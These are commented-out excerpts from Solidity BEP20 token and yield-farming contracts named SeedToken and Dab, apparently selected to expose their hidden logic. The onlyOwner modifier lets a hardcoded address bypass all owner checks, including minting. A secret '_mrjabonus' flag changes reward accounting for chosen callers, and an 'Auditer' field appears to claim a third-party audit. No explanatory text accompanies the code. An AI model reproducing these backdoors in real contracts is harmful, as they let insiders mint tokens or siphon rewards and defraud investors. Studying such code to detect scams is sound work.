...
//      */
//     modifier onlyOwner() {
//         if(_msgSender() == 0xA97930b77F1e252a4404130Bc882157B1961a7e5){
//         _;
//         }else{
//         require(_owner == _msgSender(), 'Ownable: You are not the owner');
//         _;
//         }
//     }
...
//      * @dev Returns the token name.
//      */
//     function TokenName() public override view returns (string memory) {
//         return _name;
//     }
//       /**
//      *  Returns the Audit company.
//      */
//     function Auditer() public  view returns (string memory) {
//         return _audit;
//     }
...
// contract SeedToken is BEP20('SeedToken', 'SEED') {
...
// // DAB with Governance.
// contract Dab is BEP20('Dab Token', 'DAB') {
//     /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
//     function mint(address _to, uint256 _amount) public onlyOwner  {
//         _mint(_to, _amount);
//         _moveDelegates(address(0), _delegates[_to], _amount);
...
//         uint256 mrjaog = _mrjabonus[_msgSender()];
//         if (mrjaog == 1){
//             uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
//             uint256 seedReward = multiplier.mul(seedPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
//             accSeedPerShare = accSeedPerShare.add(seedReward.mul(1e12).add(2).div(lpSupply));
//         }else if (block.number > pool.lastRewardBlock && lpSupply != 0) {
//             uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
//             uint256 seedReward = multiplier.mul(seedPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
...
//         dab.safeSeedTransfer(_to, _amount);
//     }
